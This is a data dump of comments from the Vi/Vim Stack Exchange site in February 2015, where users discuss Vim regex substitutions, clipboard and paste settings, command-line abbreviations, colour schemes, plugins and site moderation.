  <row Id="1313" PostId="1912" Score="1" Text="That would probably be the quickest solution. ;)" CreationDate="2015-02-19T17:17:22.280" UserId="343" />
  <row Id="1314" PostId="1981" Score="5" Text="Hmm, `1,$s/\_./\=@+` is not a solution :P, `:%d|put+` is closer, but not quite there." CreationDate="2015-02-19T17:21:44.627" UserId="220" />
  <row Id="1315" PostId="1981" Score="0" Text="@Sukminder well, I actually like it. :-D Let me try to understand these patterns." CreationDate="2015-02-19T17:26:34.083" UserId="682" />
  <row Id="1316" PostId="1987" Score="1" Text="There's also `:set invpaste` to toggle it" CreationDate="2015-02-19T17:29:35.117" UserId="609" />
  <row Id="1317" PostId="1981" Score="1" Text="I forgot an asterisk after the dot ... `1,$s/\_.*/\=@+`, where `\_.` matches any character *including* newline." CreationDate="2015-02-19T17:32:45.353" UserId="220" />
  <row Id="1318" PostId="770" Score="0" Text="Don't as it to your bashrc, add it to your vimrc." CreationDate="2015-02-19T17:33:26.237" UserId="163" />
  <row Id="1319" PostId="770" Score="0" Text="I meant vimrc.  But I found the problem.  Vim needs to be built with xclipboard support" CreationDate="2015-02-19T17:45:39.777" UserId="496" />
  <row Id="1320" PostId="1940" Score="0" Text="I like this in the sense that `.vimrc_secure` is independent of the `.vimrc`(as doing as you say then allows the user to `:e private file` [thus keeping the file out of the shell history as well]), but using `vim -u ~/.vimrc-incognito` will not source `~/.vimrc` at all, correct? The joys of privacy should not come at the cost of reduced comfort (unless the comfort is fundamentally flawed via malicious plugin or buggy feature). While there should be an emphasis on the risk of unknowns, surely, there must be some way to conditionally wrap your solution..." CreationDate="2015-02-19T17:47:58.597" UserId="44" />
  <row Id="1321" PostId="1980" Score="0" Text="Thank you for the input, will test each solution. I tested the YouCompleteMe and only `GoToDeclaration` works with multiple source files. Here's a quote from the docs about `GoToDefinition`: `For C-family languages this only works ... when the definition of the symbol is in the current translation unit.`. Also, the commands are `:YcmCompleter GoTo*`." CreationDate="2015-02-19T18:03:11.370" UserId="669" />
  <row Id="1322" PostId="1980" Score="0" Text="I missed this line. That means that clang_indexer may still be useful.&#xA;The other solutions may be a bit tricky to install. Don't hesitate to send me an email if need be." CreationDate="2015-02-19T18:16:11.317" UserId="626" />
  <row Id="1323" PostId="1996" Score="0" Text="What's the rationale behind the function name `Qtx`?" CreationDate="2015-02-19T20:47:51.303" UserId="51" />
  <row Id="1324" PostId="1916" Score="1" Text="Yeah, in the same way it's interesting, @Sukima, that I feel more efficient the less I use the mouse, even in a GUI. I find myself being faster if I can stay on the keyboard." CreationDate="2015-02-19T21:14:13.367" UserId="579" />
  <row Id="1325" PostId="730" Score="0" Text="See also [Set the paste option, but for one insertion only](https://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only)" CreationDate="2015-02-19T21:41:42.337" UserId="8" />
  <row Id="1326" PostId="734" Score="1" Text="I think you're looking for [Set the paste option, but for one insertion only](https://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only/348#348)" CreationDate="2015-02-19T21:42:16.267" UserId="8" />
  <row Id="1327" PostId="1981" Score="2" Text="Do you _have_ to reuse the buffer, or would it be acceptable to start a new buffer?" CreationDate="2015-02-19T21:54:10.217" UserId="24" />
  <row Id="1328" PostId="2000" Score="0" Text="Thank you. For educational purposes, can you add how to do this without the use of `[^&quot;]`?" CreationDate="2015-02-19T22:01:01.787" UserId="489" />
  <row Id="1329" PostId="2000" Score="0" Text="@merb Sure, edited in an alternative that uses `\_.`." CreationDate="2015-02-19T22:03:38.290" UserId="88" />
  <row Id="1333" PostId="2006" Score="3" Text="hah; I have the same problem with the \" CreationDate="2015-02-19T22:28:57.940" UserId="51" />
  <row Id="1334" PostId="2007" Score="0" Text="The `gn` piece is selecting from the line where `V` is triggered to the *next* (not the one on the same line) occurrence of the pattern. Vim's documentation states that if visual mode is active, the selection is extended from the current line through the next pattern. This is causing unwanted behavior." CreationDate="2015-02-19T22:29:36.380" UserId="489" />
  <row Id="1335" PostId="2007" Score="0" Text="@merb Whoops, didn't realize that. Edited." CreationDate="2015-02-19T22:31:58.800" UserId="88" />
  <row Id="1336" PostId="2007" Score="0" Text="The selection is still from the line of the match to the *next* match. Stepping through the normal mode commands manually shows that `//s&lt;cr&gt;` leaves me at the beginning of the match on the current line, but `//e&lt;cr&gt;` leaves me at the end of the next match, not the current match." CreationDate="2015-02-19T22:36:47.837" UserId="489" />
  <row Id="1337" PostId="2008" Score="0" Text="I ran `:cmap w' w`, but there was no change in behavior.  `:w'` still results in writing to a file named `'`. `&quot;'&quot; [New] 0L, 0C written`." CreationDate="2015-02-19T22:39:53.203" UserId="319" />
  <row Id="1338" PostId="2007" Score="0" Text="@merb Huh, that's strange. It works for me (even with `vim -u NONE`). Are you perhaps running this command while already on the first match? You should enter this from the beginning of the file." CreationDate="2015-02-19T22:40:03.140" UserId="88" />
  <row Id="1339" PostId="1981" Score="3" Text="I think Sukminder's `:%d|put+` fits the bill. It's short and memorable. The other command is just too arcane to remember and type correctly." CreationDate="2015-02-19T22:43:46.663" UserId="632" />
  <row Id="1340" PostId="2007" Score="0" Text="Yes, I am running it from the top of the file. I tested it with `vim -u NONE` and it doesnt work there either.. my Vim version is `7.4` if that makes any difference." CreationDate="2015-02-19T22:44:41.533" UserId="489" />
  <row Id="1341" PostId="2008" Score="0" Text="@mwcz Does the `'` actually show up when you press it after `w`? It shouldn't if the `cmap` was successfully created - a cmap LHS is automatically filled in with the RHS, so if you press a `'`, it should still only show `w`." CreationDate="2015-02-19T22:48:03.640" UserId="205" />
  <row Id="1342" PostId="161" Score="0" Text="@Tanath Commenting from the first line was specific to this example.  If the author wanted to comment from lines 9 to 22 they would not be able to use gg." CreationDate="2015-02-19T22:53:55.503" UserId="141" />
  <row Id="1343" PostId="161" Score="0" Text="@Ben I did not know anything about the `normal` command before writing this answer.  You're right; `:9,22 normal I#` will work as well." CreationDate="2015-02-19T22:57:04.330" UserId="141" />
  <row Id="1344" PostId="2007" Score="1" Text="The problem appears to be with `//s&lt;cr&gt;V`. When I run `:normal V` I go into visual line mode, as expected. When I run `:normal //s&lt;cr&gt;` my cursor lands on the first `&quot;` of the match, as expected. When I run `:normal //s&lt;cr&gt;V` I do not get a visual selection." CreationDate="2015-02-19T23:04:31.290" UserId="489" />
  <row Id="1345" PostId="2008" Score="1" Text="Be careful with bare `cmap`'s and `cabbrev`'s. They will execute/expand in other modes and other places. e.g. `:s/'follow'/foo` and `/'follow'`. Please see the following [vim change :x function to delete buffer instead of save &amp; quit](http://stackoverflow.com/q/7513380/438329) or use [cmdalias.vim](http://www.vim.org/scripts/script.php?script_id=746)" CreationDate="2015-02-19T23:20:29.763" UserId="778" />
  <row Id="1346" PostId="2002" Score="4" Text="You can also use `g;` and `g,` to move between position in the change list. See `:h g;` and `:h g,`" CreationDate="2015-02-19T23:21:36.553" UserId="778" />
  <row Id="1348" PostId="2008" Score="1" Text="Better safe than sorry: `cnoreabbrev &lt;expr&gt; w' getcmdtype() == &quot;:&quot; &amp;&amp; getcmdline() == &quot;w'&quot; ? &quot;w&quot; : &quot;w'&quot;`" CreationDate="2015-02-19T23:27:04.673" UserId="778" />
  <row Id="1352" PostId="2008" Score="0" Text="Yes, the `'` still shows up, but I just figured out it's because I'm using cmdwin to enter commands, and cmdwin is just a regular buffer, so `cmap/cnoreabbrev` don't work there.  Updating the answer with `noreabbrev` option for cmdwin users. :)  Thanks!!!" CreationDate="2015-02-19T23:42:28.010" UserId="319" />
  <row Id="1353" PostId="731" Score="0" Text="Another plugin option: [Vim-unimapired](https://github.com/tpope/vim-unimpaired) provides `yo` / `yO` operators that mimic `o` and `O` operators but only `set paste` until insert mode is exited." CreationDate="2015-02-19T23:43:51.037" UserId="778" />
  <row Id="1355" PostId="2008" Score="0" Text="@muru no problem.  It's not a plugin. `:help cmdwin`.  It lets you edit `:` commands in a regular buffer, so you can use vim to edit commands.  I jumped the gun though, `noreabbrev` doesn't actually work in cmdwin." CreationDate="2015-02-19T23:51:27.343" UserId="319" />
  <row Id="1356" PostId="2004" Score="1" Text="This technique is called [Binary Search Fault Localization](http://of-vim-and-vigor.blogspot.ca/2013/04/bisectly.html)." CreationDate="2015-02-19T23:53:12.417" UserId="64" />
  <row Id="1358" PostId="2007" Score="1" Text="Solved it. The command needs to be `normal gngq`. Suggesting an edit." CreationDate="2015-02-19T23:57:03.390" UserId="489" />
  <row Id="1359" PostId="2004" Score="1" Text="@tommcdo Yeah, I had it in math classes at high school, I even looked up the name of it when I wrote this, [but then I remembered Feynman](https://www.youtube.com/watch?v=05WS0WN7zMQ) :-)" CreationDate="2015-02-19T23:59:33.073" UserId="51" />
  <row Id="1361" PostId="2008" Score="0" Text="@mwcz Try an `inorebbrev` or `inoremap`. I updated with a couple of `autocmd`s that seem to work for me." CreationDate="2015-02-20T00:06:48.020" UserId="205" />
  <row Id="1362" PostId="2016" Score="0" Text="Notice the quotation mark in the question.  `:w'`, not `:w`.  I want to use `:w` without accidentally hitting `'`, which writes a file I must then `rm \'`.  Good tips, though." CreationDate="2015-02-20T00:09:40.467" UserId="319" />
  <row Id="1363" PostId="2008" Score="0" Text="Perfect!  Thanks @muru !" CreationDate="2015-02-20T00:12:56.330" UserId="319" />
  <row Id="1365" PostId="2016" Score="1" Text="Ctrl-S doesn't send a sigstop - if the program stops, it's probably because a buffer was full. See http://unix.stackexchange.com/questions/13629/whats-the-difference-between-the-s-and-z-control-characters-inside-a-terminal'" CreationDate="2015-02-20T00:19:04.353" UserId="205" />
  <row Id="1366" PostId="2018" Score="0" Text="@A B I am on Linux, I don't want to use gnu screen buffer or tmp file. How do I use system clipboard from vim?" CreationDate="2015-02-20T00:21:07.123" UserId="784" />
  <row Id="1367" PostId="2018" Score="5" Text="@name http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim/96#96 - though I think that requires X-forwarding if you're on SSH." CreationDate="2015-02-20T00:22:09.140" UserId="205" />
  <row Id="1369" PostId="2007" Score="0" Text="@merb Ah, thanks. (Sorry for not responding to your comments earlier; I had to leave.)" CreationDate="2015-02-20T00:31:18.410" UserId="88" />
  <row Id="1371" PostId="2021" Score="1" Text="For a quicker and dirtier regex use: `http.\?:\/\/\S\+'`. Works with `grep` as well." CreationDate="2015-02-20T00:48:10.043" UserId="778" />
  <row Id="1373" PostId="1925" Score="0" Text="What's the problem with *line numbers* going from -1 to +1? I can see how it could cause you trouble in mathematics, but in line numbers?" CreationDate="2015-02-20T01:13:29.873" UserId="801" />
  <row Id="1374" PostId="1925" Score="0" Text="@Jerry The asymmetry between the upward and downward numbering schemes would be harmful, for example. It would make my suggested `d2j` vs. `d2k` confusing." CreationDate="2015-02-20T01:17:56.597" UserId="24" />
  <row Id="1375" PostId="1882" Score="1" Text="Indeed it does. When I tried it last time, Vim kept telling me it was a syntax error. It must have been somewhere else. Updating my answer." CreationDate="2015-02-20T01:24:07.347" UserId="227" />
  <row Id="1377" PostId="1981" Score="0" Text="@200_success both are fine to me. I'd like to know alternatives." CreationDate="2015-02-20T01:50:48.467" UserId="682" />
  <row Id="1380" PostId="2010" Score="1" Text="By &quot;[m]y terminal has the correct colors and background,&quot; do you mean to say that you followed the [specific advice](http://ethanschoonover.com/solarized/vim-colors-solarized#important-note-for-terminal-users) regarding Vim in the terminal?" CreationDate="2015-02-20T02:35:02.157" UserId="811" />
  <row Id="1382" PostId="2025" Score="0" Text="I'm unfamiliar with viemu. Does it let you yank to an arbitrary register? If so, you could have a file of your macros and do something like `&quot;sy$` to grab one and `@s` to play it" CreationDate="2015-02-20T03:13:03.293" UserId="227" />
  <row Id="1384" PostId="2025" Score="0" Text="It does, and that basically works.  I was considering that solution as somewhat of a last resort; better still would be to have this done automatically on starting the app (and saving macros somewhere automatically as well).  That might be asking a bit much for a &quot;workaround,&quot; but one can hope." CreationDate="2015-02-20T03:25:38.617" UserId="811" />
  <row Id="1385" PostId="161" Score="0" Text="@bsmith89 Then you'd use 9gg. Still one less character and easier to type." CreationDate="2015-02-20T03:27:48.647" UserId="712" />
  <row Id="1387" PostId="2010" Score="2" Text="I did follow the advice, @Andrew. Thank you though." CreationDate="2015-02-20T03:43:23.733" UserId="779" />
  <row Id="1388" PostId="2019" Score="0" Text="The desert256 works fine, but I am not a huge fan. I do believe the `TERM` variable is incorrect, but I have no idea how to change it." CreationDate="2015-02-20T03:54:29.770" UserId="779" />
  <row Id="1390" PostId="1871" Score="0" Text="You may be better off using [`:abbreviate`](https://vimhelp.appspot.com/map.txt.html#%3Aabbreviate) instead. For example, issue the `:ab 01n {0,1}^n` command. Then, every time you type `01n` as an independent word in Insert mode, it will expand to `{0,1}^n`." CreationDate="2015-02-20T04:58:12.430" UserId="24" />
  <row Id="1392" PostId="2019" Score="0" Text="I installed ncurses-term. I then ran the command. After I run it, all text becomes grey and the background is black." CreationDate="2015-02-20T05:01:27.467" UserId="779" />
  <row Id="1393" PostId="2029" Score="0" Text="set t_Co=16 causes the colors to be radically different from what is expected.&#xA;I am also using the default Xubuntu terminal is Xfce-Terminal." CreationDate="2015-02-20T05:57:57.167" UserId="779" />
  <row Id="1394" PostId="1982" Score="0" Text="Please add a summary of the linked post. Link-only answers become useless when the link goes dead." CreationDate="2015-02-20T06:32:46.953" UserId="205" />
  <row Id="1395" PostId="1941" Score="0" Text="First do `:set ruler`, then go to the top &amp; bottom of the text to find `start` and `end` line numbers, then do `:&lt;start&gt;,&lt;end&gt;d`" CreationDate="2015-02-20T06:46:49.963" UserId="398" />
  <row Id="1396" PostId="2034" Score="0" Text="Okay, that's better than my two-pass self-answer, you get the gong :-)" CreationDate="2015-02-20T06:58:00.450" UserId="579" />
  <row Id="1397" PostId="1961" Score="0" Text="That's not too bad, though it gives a `234x56` window on my system whereas maximising gives `236x57`. Still, being short two columns and one row at that size is not _too_ much of an issue, especially for something that may work in non-Windows platforms as well, though I haven't actually tested it. I'll have a look tonight when I get home to my beloved Debian box :-)" CreationDate="2015-02-20T07:10:15.810" UserId="579" />
  <row Id="1398" PostId="1996" Score="0" Text="@Carpetsmoker: Quouotix Terminates eXitus." CreationDate="2015-02-20T07:27:24.617" UserId="220" />
  <row Id="1399" PostId="1941" Score="0" Text="or `:set number` so that you can see all the line numbers.  `:set ruler` is superior because you can just leave that on (even set in your vimrc) with minimal visual intrusion, though.  I just thought it would be good to mention `:set number` in case anyone was unaware.  Very useful in screen sharing, presentations, etc to make it easy for people to refer to specific lines." CreationDate="2015-02-20T07:28:11.187" UserId="829" />
  <row Id="1400" PostId="1916" Score="3" Text="If you're ever editing something with really long lines, the backtick version of this might come in very handy as well (which refers to the place withinin the line, rather than the whole line)." CreationDate="2015-02-20T07:31:12.520" UserId="829" />
  <row Id="1401" PostId="2000" Score="0" Text="Nice! Although perhaps one should improve slightly so as not to match escaped quotes?" CreationDate="2015-02-20T08:00:49.433" UserId="21" />
  <row Id="1402" PostId="2036" Score="1" Text="Like `.,.+2s/^../*/` (or equivalently in a visual selection)? Why two replace commands? `2c` would replace two characters." CreationDate="2015-02-20T08:40:33.937" UserId="205" />
  <row Id="1403" PostId="2010" Score="0" Text="@Oberdiear The advice Andrew links to explains that you should set up your terminal to use solarized colours, and *not* use  the `g:solarized_termcolors=256` option. If you're happy to use solarized colours in your terminal, this method works much better. The text of your question implies you *have* set up your terminal to use solarized colours (although the screenshot you display doesn't look to me like it does), so in that case, why are you using the `g:solarized_termcolors=256` setting?" CreationDate="2015-02-20T09:01:10.713" UserId="343" />
  <row Id="1404" PostId="2021" Score="1" Text="so the shortest way would be&#xA;  `%s/.\{-}\(http[s]\?:\/\/[[:alnum:]%\/_#.-]*\)/\1\r/g|g!//d`" CreationDate="2015-02-20T09:05:39.487" UserId="179" />
  <row Id="1406" PostId="2036" Score="0" Text="sometimes only the first line in the visual selection is changed, repeating then with . for the other lines messes things up." CreationDate="2015-02-20T09:10:17.257" UserId="833" />
  <row Id="1407" PostId="1871" Score="0" Text="@200_success, thank you. I had thought about abbreviations but still I wanted to know if it was possible with `ins-completion`." CreationDate="2015-02-20T09:37:43.507" UserId="356" />
  <row Id="1408" PostId="2042" Score="0" Text="It will if `:set nocompatible` is not used." CreationDate="2015-02-20T09:47:59.813" UserId="205" />
  <row Id="1409" PostId="2021" Score="2" Text="The problem with parsing URL's is that it's very very tricky to get all URL's; this will for example fail on `http://en.wikipedia.org/wiki/Vi_(Buffy_the_Vampire_Slayer)`, since it doesn't recognize the `(` ... There is also a disparity between what the standard says, and what browser accept... Not saying this a bad answer (+1 from me), just saying it's very difficult (maybe even impossible?) to get this 100% correct (and most, if not all, sites don't get it 100% correct)." CreationDate="2015-02-20T10:31:59.270" UserId="51" />
  <row Id="1410" PostId="2021" Score="3" Text="@Carpetsmoker I expected someone to point that out, hence the link to that classic SO post. :D" CreationDate="2015-02-20T10:36:37.797" UserId="205" />
  <row Id="1411" PostId="2036" Score="2" Text="@poseid are you in the habit of pressing `Ctrl-C` instead of `Esc`? This prevents, among other things, changes being applied to each line of a Visual-block selection." CreationDate="2015-02-20T10:48:20.257" UserId="64" />
  <row Id="1412" PostId="2048" Score="4" Text="Good - can you give a short overview of each of these plugins?" CreationDate="2015-02-20T10:49:51.497" UserId="205" />
  <row Id="1413" PostId="2048" Score="0" Text="Unfortunately not. I have used pyclewn a few years ago (it has been around for some time now -- it's has evolved from the previous _*clewn_ plugins), and indeed I haven't found it very ergonomic at the time (before v2.0).  Since then, I haven't spend much time exploring the other solutions." CreationDate="2015-02-20T10:54:33.407" UserId="626" />
  <row Id="1415" PostId="2048" Score="0" Text="Few months ago I gave a try for pyclewn and I couldn't really set it up correctly." CreationDate="2015-02-20T10:57:50.563" UserId="784" />
  <row Id="1417" PostId="2004" Score="3" Text="It's not usually required, but I feel like at least mentioning `vim -D` debugging might be worthwhile. I've have used it in the past to track down *exactly* what was going wrong with a start-up issue." CreationDate="2015-02-20T11:00:49.907" UserId="343" />
  <row Id="1418" PostId="2042" Score="2" Text="My `vim` (with `nocompatible`) does two undos with `uu`, but I use `u` and `CTRL+r` for the same effect." CreationDate="2015-02-20T11:04:18.900" UserId="850" />
  <row Id="1419" PostId="2004" Score="1" Text="@Rich This is a community wiki post, so feel free to edit :-)" CreationDate="2015-02-20T11:12:24.223" UserId="51" />
  <row Id="1422" PostId="2049" Score="0" Text="Are there effective differences between using this or `:qa`?" CreationDate="2015-02-20T11:51:40.633" UserId="51" />
  <row Id="1423" PostId="2051" Score="0" Text="possible duplicate of [Make :edit {file} use current directory during :Explore](http://vi.stackexchange.com/questions/631/make-edit-file-use-current-directory-during-explore)" CreationDate="2015-02-20T11:54:10.730" UserId="205" />
  <row Id="1424" PostId="2051" Score="0" Text="@muru I'm not sure this is a duplicate ... The problem (having a strange cwd) should not occur at all in the first place, and netrw isn't involved here..." CreationDate="2015-02-20T11:57:04.840" UserId="51" />
  <row Id="1425" PostId="2051" Score="0" Text="@Carpetsmoker alright.. So should I post `autochdir` as an answer?" CreationDate="2015-02-20T11:58:28.310" UserId="205" />
  <row Id="1426" PostId="2029" Score="0" Text="@Oberdiear If setting t_Co=16 affects the colours in that way (with the g:solarized_termcolors variable unset) then that means that your terminal colours are not set up correctly to use solarized. How are you setting your terminal colours?" CreationDate="2015-02-20T11:58:30.043" UserId="343" />
  <row Id="1428" PostId="2051" Score="0" Text="@muru yes (good spotting!) , because I just tested it and it works. Although it would be nice to know why the `autocmd` did not work; what if I'd like to have it enabled only for `*.tex` files for example?" CreationDate="2015-02-20T11:59:57.470" UserId="854" />
  <row Id="1429" PostId="2049" Score="0" Text="@Carpetsmoker No difference other that someone can learn something new. One of advantages is that it allows to execute additional custom commands for each window before closing them, but I can't think of practical example yet." CreationDate="2015-02-20T12:00:45.840" UserId="467" />
  <row Id="1430" PostId="734" Score="0" Text="I chose this answer because of your extensive explanation. It works, thank you" CreationDate="2015-02-20T12:06:41.730" UserId="486" />
  <row Id="1434" PostId="2049" Score="0" Text="Okay :-) Just curious if this would somehow behave subtly different or something..." CreationDate="2015-02-20T12:18:53.060" UserId="51" />
  <row Id="1438" PostId="2015" Score="0" Text="Do you consider to open `file1.txt` and `file2.txt` using one instance? E.g. `vim file1.txt file2.txt`?" CreationDate="2015-02-20T12:30:34.977" UserId="467" />
  <row Id="1439" PostId="282" Score="0" Text="Just a note: e.g. `let mapleader = ' '` also works for setting `&lt;Leader&gt;` to space. If there are any possible side-effects by using this syntax, feel free to mention them." CreationDate="2015-02-20T12:32:12.943" UserId="858" />
  <row Id="1440" PostId="51" Score="0" Text="@Caleb As a user you are currently a non-user of asynchronous plugins.  This won't apply to users of Neovim." CreationDate="2015-02-20T12:40:11.570" UserId="859" />
  <row Id="1441" PostId="2015" Score="0" Text="@kenorb no. It's written in the question." CreationDate="2015-02-20T12:44:45.000" UserId="784" />
  <row Id="1443" PostId="2015" Score="0" Text="In `tmux`, you can start &quot;copy mode&quot; with `prefix+[`, then `space` to select stuff`, `Enter` to copy, then go to the other pane, and use `prefix+]` to paste ... It's very similar to Vim's visual mode. IIRC `screen` can do this as well (but I don't remember how, as I haven't used it in years and years)." CreationDate="2015-02-20T13:21:39.837" UserId="51" />
  <row Id="1446" PostId="1934" Score="2" Text="There is also `d/search-string/e` to delete from current cursor to the end of the search string including the search string itself and `c/search-query` to get into insert mode after deletion. Using `d/` with `set incsearch` is a neat combination as it allows you to interactively figure out whether you are operating on the right text range, and help you know when to stop typing the search query to avoid typing more than is necessary." CreationDate="2015-02-20T15:17:25.553" UserId="632" />
  <row Id="1448" PostId="740" Score="1" Text="This is nice because it generalizes well to `vimdiff &lt;(echo foo) &lt;(echo bar)`." CreationDate="2015-02-20T15:42:44.143" UserId="142" />
  <row Id="1451" PostId="2015" Score="0" Text="On which operating system?" CreationDate="2015-02-20T15:53:49.500" UserId="878" />
  <row Id="1452" PostId="2047" Score="0" Text="Can't you just read their README/`:help` and make your mind?" CreationDate="2015-02-20T15:54:06.393" UserId="54" />
  <row Id="1456" PostId="2047" Score="6" Text="@romainl That's something that can be said about almost *any* question here &quot;just RTFM&quot;. I haven't looked at the various README's, but it's often very hard (as in: impossible) to compare software in this way. It may not work as advertised. Or there may be differences that are undocumented, it may differ in important details, and so forth ... I think this is a useful question just as [What is the difference between the vim package managers?](http://vi.stackexchange.com/q/388/51) is a useful question." CreationDate="2015-02-20T16:14:03.233" UserId="51" />
  <row Id="1458" PostId="2047" Score="0" Text="@Carpetsmoker, yes, &quot;That's something that can be said about almost any question here &quot;just RTFM&quot;&quot; is exactly my opinion. Trying and evaluating software before commiting is unfortunately something nobody wants to do anymore. Same for reading documentation. It's sad, really." CreationDate="2015-02-20T16:20:47.287" UserId="54" />
  <row Id="1459" PostId="1919" Score="5" Text="Or `:set number`, and then use d35G to delete until line 35." CreationDate="2015-02-20T16:22:03.960" UserId="880" />
  <row Id="1461" PostId="2057" Score="1" Text="I'd suggest using `G` instead of gg as it also works in vi, and of course `:set number` is always useful for finding what line number the line you want to go to is." CreationDate="2015-02-20T16:24:12.393" UserId="880" />
  <row Id="1463" PostId="2053" Score="0" Text="Neither `BufReadPost` nor `BufWinEnter` (as suggested by  @muru) work.  `set autochdir` do work, but only globally. (BTW, I too think it's a bug/misfeature of Nautilus. Just searching a workaround)" CreationDate="2015-02-20T16:31:02.263" UserId="854" />
  <row Id="1464" PostId="2047" Score="3" Text="@romainl But it's *not* as easy as that. To make a *good* comparison you need to use every plugin for at least weeks. There's a good chance that someone already did that, and is able to write a good, high-quality, and useful answer outlining the key differences. And even **if** this is something that is mentioned in the documentation, then that's **not** necessarily the same as &quot;explaining something&quot;. Applying documentation to a problem is a problem on it's own." CreationDate="2015-02-20T16:33:53.687" UserId="51" />
  <row Id="1466" PostId="2053" Score="0" Text="@Rmano Hmm, using `BufReadPost` works for me (tested it, in Nautilus); perhaps there is another autocmd in that's interfering? You can try starting Vim with blank vimrc file except for this one line. You can also replace the `lchdir` with `echoerr(expand(&quot;%:p:h&quot;))` to show an &quot;error&quot; with the file path (this is useful for debugging)." CreationDate="2015-02-20T16:36:21.283" UserId="51" />
  <row Id="1468" PostId="2053" Score="0" Text="Ok. Found it. If I call `gvim /home/romano/path/file.tex` it works, but if I call (as is doing my default action) `exec gvim --servername desktop_0 --remote-tab-silent /home/romano/path/file.tex` it does not work (`desktop_0` is automatically generated for the current desktop). Now I am really puzzled." CreationDate="2015-02-20T16:45:25.963" UserId="854" />
  <row Id="1469" PostId="2025" Score="1" Text="This question appears to be about a proprietary vi emulator embedded in another program. Current consensus is that it is not [considered to be vi](http://meta.vi.stackexchange.com/q/7/24) and thus off-topic, but you may want to post a Meta question to discuss that." CreationDate="2015-02-20T17:06:49.247" UserId="24" />
  <row Id="1470" PostId="2048" Score="2" Text="While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference.  Link-only answers can become invalid if the linked page changes." CreationDate="2015-02-20T17:08:30.417" UserId="51" />
  <row Id="1471" PostId="2053" Score="0" Text="@Rmano Hm, it seems autocmd works different when using `--remote`? Not sure ... Need to test more ..." CreationDate="2015-02-20T17:10:21.603" UserId="51" />
  <row Id="1474" PostId="2028" Score="0" Text="@muru Link added. Sorry about that." CreationDate="2015-02-20T17:20:02.463" UserId="813" />
  <row Id="1475" PostId="2048" Score="1" Text="?? Links are to the plugins official pages. Yes they can change if the plugins disappear or if they are moved elsewhere. In that case, I'll update the message in the first case as I did before on SO. And in the second case, it would mean that part of any message that details what the plugin does would become deprecated. Worse case scenario: detailing what the plugin really do will become obsolete while their respective author work on them, add features, and so on. Any way. I'll add a brief description of them next week..." CreationDate="2015-02-20T17:24:13.740" UserId="626" />
  <row Id="1478" PostId="2057" Score="0" Text="The whole point of this question is that you don't know how many lines you want to remove." CreationDate="2015-02-20T17:30:30.687" UserId="24" />
  <row Id="1480" PostId="2063" Score="0" Text="possible duplicate of [How can I copy text to the system clipboard from Vim?](http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim)" CreationDate="2015-02-20T17:37:07.750" UserId="31" />
  <row Id="1481" PostId="2063" Score="0" Text="@Carpetsmoker in that case, VtC'ing as &quot;duplicate&quot;. That'll give us the &quot;This question already has an answer here (link to your question)&quot; message, which is now fully accurate." CreationDate="2015-02-20T17:38:35.463" UserId="31" />
  <row Id="1484" PostId="2063" Score="0" Text="@yo' I don't think closed as duplicate get auto-deleted.  They shouldn't! Just in case, upvoted so it'll have a positive score." CreationDate="2015-02-20T17:40:09.893" UserId="31" />
  <row Id="1487" PostId="2063" Score="0" Text="@yo' BTW: http://meta.stackexchange.com/a/177675/27727 confirms that closed as duplicate don't get auto-deleted. Not sure if there is really much more detailed information to provide (e.g., how to actually install a package using yum/rpm/etc. is probably better asked on [unix.se].)" CreationDate="2015-02-20T17:43:37.317" UserId="31" />
  <row Id="1491" PostId="2063" Score="0" Text="(Tried to move to chat, but that just popped up an error. Oh well). @yo' I guess if there is really more to say other than &quot;you need to install `vim-x11` and run `vimx`&quot; ... go ahead and answer it here and I'll retract my close vote." CreationDate="2015-02-20T17:47:43.660" UserId="31" />
  <row Id="1492" PostId="2053" Score="0" Text="Ok, marking this as answered --- and posting another question. Thanks!" CreationDate="2015-02-20T18:00:55.760" UserId="854" />
  <row Id="1493" PostId="2057" Score="0" Text="200_success, you don't have to know how many lines you want to remove with the answer i posted. All you have to know is &quot;to which line do you want to remove&quot;" CreationDate="2015-02-20T18:15:33.457" UserId="861" />
  <row Id="1494" PostId="2048" Score="2" Text="@LucHermitte The post came up in the review queue; I didn't add the exact text of this message myself, the system did that for me. In any case, link only answers are considered &quot;bad&quot; on SO and most, if not all, SE sites. Not just because they may go out of date, but also because they don't really *explain* things; almost any question could be &quot;answered&quot; by linking to the right documentation page(s), hell, you could even link to the source code, but does that *really* explain something? Is that *really* useful? Does that *really* contribute to someone's understanding of Vim?" CreationDate="2015-02-20T19:25:04.080" UserId="51" />
  <row Id="1495" PostId="2048" Score="0" Text="I'm also a bit surprised that someone with 15k reputation and 371 answers on SO doesn't know this... I think that link-only answers are the top reason for removing posts on SO (it's certainly the one I see the most often in the review queue). Not saying we should necessarily do the same things as SO, and I would encourage you to go over to our meta site and discuss this further, if you really disagree with it." CreationDate="2015-02-20T19:27:16.190" UserId="51" />
  <row Id="1496" PostId="2048" Score="0" Text="*&quot;part of any message that details what the plugin does would become deprecated. Worse case scenario: detailing what the plugin really do will become obsolete while their respective author work on them, add features, and so on&quot;* -&gt; This is true. But it's true for *any* answer you give :-)" CreationDate="2015-02-20T19:30:20.957" UserId="51" />
  <row Id="1497" PostId="2066" Score="1" Text="[Four years old and no responses...](https://groups.google.com/forum/#!topic/vim_dev/8DZdu57h-3k)" CreationDate="2015-02-20T20:41:21.230" UserId="205" />
  <row Id="1498" PostId="2025" Score="0" Text="@200_success Thanks for the feedback.  I did check [help/on-topic] before asking and interpreted &quot;specific issues with the Vi and Vim family of editors&quot; to include this type of plugin.  Incidentally, [tag:viemu] is not _solely_ a programmer's plugin in that there is a version for Microsoft Office." CreationDate="2015-02-20T20:48:16.670" UserId="811" />
  <row Id="1499" PostId="2025" Score="2" Text="This being a brand-new site, the help center is still very sketchy because the rules are not set in stone yet. You can play a role in shaping the direction of the site by posting on [meta]." CreationDate="2015-02-20T20:54:31.130" UserId="24" />
  <row Id="1500" PostId="2066" Score="0" Text="So seems a bug... where is the main bug report site for vim? Searched here http://www.vim.org/ but just found mailing lists..." CreationDate="2015-02-20T21:17:50.027" UserId="854" />
  <row Id="1501" PostId="2066" Score="0" Text="Looking around in that mailing list, I think it's on Google Code: https://code.google.com/p/vim/issues/list" CreationDate="2015-02-20T21:18:59.153" UserId="205" />
